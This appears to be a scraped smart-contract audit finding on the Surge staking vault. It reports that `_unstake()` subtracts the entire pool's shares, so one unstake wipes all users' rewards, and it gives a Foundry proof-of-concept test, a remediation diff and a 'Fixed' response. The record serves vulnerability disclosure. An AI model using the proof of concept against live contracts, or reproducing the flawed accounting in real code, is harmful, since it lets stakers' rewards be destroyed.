---
tags:
  - lang/solidity
  - sector/governance
  - sector/staking
  - sector/staking-pool
  - platform/shieldify
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/reward-calculation
  - novelty/variant
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Surge]]"
auditors:
  - "[[Shieldify Security]]"
report: "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Surge-Security-Review.md"
genome:
  - "[[reward-calculation]]"
  - "[[variant]]"
  - "[[reward-theft]]"
  - "[[reward-accounting]]"
---
# [H-03] Unstake Causes All Users to Lose Their Rewards

- id: 55142
- impact: HIGH
- protocol: [[Surge]]
- reporter: Shieldify Security (Shieldify)
- source: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Surge-Security-Review.md

## Summary

`StakingVault._unstake()` reads the total pool shares for the current cycle and subtracts that entire value from itself (`_rewardPoolShares[poolId][cycleId] -= shares`) instead of subtracting only the unstaking user's personal share amount. One unstake zeroes out all shares for the cycle, wiping rewards for every user going forward.

## Details

- Vulnerable code: `StakingVault._unstake()` (StakingVault.sol)
- Root cause: `shares` is assigned from `_rewardPoolShares[poolId][cycleId]` (the **total** pool shares) and then subtracted from that same slot, effectively setting it to zero rather than decrementing by the individual user's stake.
- Impact: `claimRewardsToOwed()` uses `_rewardPoolShares` to compute per-user rewards; after any unstake the divisor is 0, causing all future reward calculations to return 0 for all users.

## Proof of Concept

```solidity
function test_unstake_lose_rewards_poc() public {
    address user     = makeAddr("user");
    address attacker = makeAddr("attacker");

    uint256 amount = 1000;
    uint16  period = 315; // days

    vm.startPrank(user);
    deal(address(stakingToken), user, amount);
    stakingToken.approve(address(uut), amount);
    uut.stake(amount, period);
    vm.stopPrank();

    vm.startPrank(attacker);
    deal(address(stakingToken), attacker, amount);
    stakingToken.approve(address(uut), amount);
    uut.stake(amount, 28);

    console.log("total shares cycle 1:", uut.totalShares(1, 1));

    skip(28 days + 10);
    uut.endCycleIfNeeded();

    console.log("total shares cycle 5:", uut.totalShares(1, 5));

    uut.unstake(); // <-- zeroes _rewardPoolShares for all cycles
    console.log("attacker unstakes");

    console.log("total shares cycle 1:", uut.totalShares(1, 1)); // 0
    console.log("total shares cycle 5:", uut.totalShares(1, 5)); // 0
    vm.stopPrank();

    uint256 daysUntilUserUnlock = period - 28;
    skip(daysUntilUserUnlock * 1 days);
    uut.endCycleIfNeeded();

    // user's rewards are now unclaimable
}
```

## Remediation

In `_unstake()`, replace the total-pool read with the **user's** share amount before decrementing:

```diff
- uint256 shares = _rewardPoolShares[poolId][cycleId];
+ uint256 shares = _userShares[user][poolId]; // or equivalent per-user field
  _rewardPoolShares[poolId][cycleId] -= shares;
```

Only subtract the shares that belong to the unstaking user, not the entire pool total.

## Team Response

Fixed.

## Artifacts

- Raw capture: /Users/user/Desktop/crawlee-run/pages_capture.har
- Pages snapshot: /Users/user/Desktop/crawlee-run/findings_pages.json
